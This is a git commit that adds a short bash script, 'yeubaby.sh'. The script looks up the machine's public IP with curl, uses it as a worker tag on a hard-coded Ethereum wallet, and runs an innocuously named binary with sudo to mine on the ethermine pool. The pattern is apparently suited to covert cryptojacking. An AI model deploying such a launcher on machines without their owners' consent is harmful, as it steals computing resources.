466afe131fae8ef24914192a93e238926d49f948
viencaytrong <55699469+viencaytrong@users.noreply.github.com>
2021-08-10 03:37:37 +0700

    Add files via upload

---
+++ yeubaby.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+POOL=asia1.ethermine.org:4444
+WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.$(echo "$(curl -s ifconfig.me)" | tr . _ )-yeubaby
+
+cd "$(dirname "$0")"
+
+chmod +x ./yeubaby && sudo ./yeubaby --algo ETHASH --pool $POOL --user $WALLET  $@
